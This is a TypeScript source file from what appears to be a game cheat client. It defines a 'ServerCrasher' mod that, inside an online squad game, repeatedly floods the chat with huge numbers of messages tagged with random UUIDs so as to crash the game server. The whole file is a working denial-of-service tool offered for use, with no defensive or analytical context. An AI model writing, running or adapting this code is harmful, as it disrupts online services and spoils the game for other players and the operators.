import gameRefs from "@/utils/refs/game";
import { Category, Mod } from "@vape-rewrite/core";
import { showNotification } from "@vape-rewrite/ui-api";

function waitUntilNextFrame() {
	return new Promise<void>(r => requestAnimationFrame(() => r()));
}

const MAX_PER_FRAME = 100000;

function sendMessage(text: string) {
	const { network, onlineInstance: instance } = gameRefs;
	if (!instance && !network) return;
	function sendWithNetwork() {
		network.sendChatMessage(text);
	}
	function sendAlt() {
		instance.chat.sendMessage.bind({
			textBoxEl: {
				value: text,
				blur() {}
			}
		})();
	}
	if (!network && instance)
		return sendAlt();
	else if (network) return sendWithNetwork();
}

export default class ServerCrasher extends Mod {
	name = "ServerCrasher";
	category = Category.UTILITY;
	#messageSetting = this.createTextBoxSetting("Message", "SERVER CRASHED BY VAPE REWRITE");
	#spamAmountSetting = this.createSliderSetting("MessageAmount", 999999e9, 100, Number.MAX_VALUE);
	#intervalSetting = this.createSliderSetting("Interval", 1e3, 1, 1e6, 10);
	#intv?: number;
	get #spamAmount() {
		return this.#spamAmountSetting.value();
	}
	get #message() {
		return this.#messageSetting.value();
	}
	get #interval() {
		return this.#intervalSetting.value();
	}
	protected async onEnable() {
		const { instance, network } = gameRefs;
		if (!instance) {
			showNotification("ServerCrasher", "a game hasn't even started... can't crash now", "alert");
			return this.toggleSilently();
		}
		if (!("chat" in instance)) {
			showNotification("ServerCrasher", "not in an online game! (why would you crash an offline game???)", "alert");
			return this.toggleSilently();
		}
		if (!network?.squadManager.isInSquad || !instance.chat.visible) {
			showNotification("ServerCrasher", "not in a squad (or you're toggling this early and chat isn't visible)", "alert");
			return this.toggleSilently();
		}
		this.#intv = setInterval(async () => {
			// let doneThisFrame = 0;
			for (let i = 0; i < this.#spamAmount; i++) {
				sendMessage(`${this.#message} ${crypto.randomUUID()}`);
				// if (doneThisFrame++ > MAX_PER_FRAME) await waitUntilNextFrame();
			}
		}, this.#interval);
	}
	protected onDisable(): void {
		if (this.#intv) {
			clearInterval(this.#intv);
			this.#intv = -1;
		}
	}
}
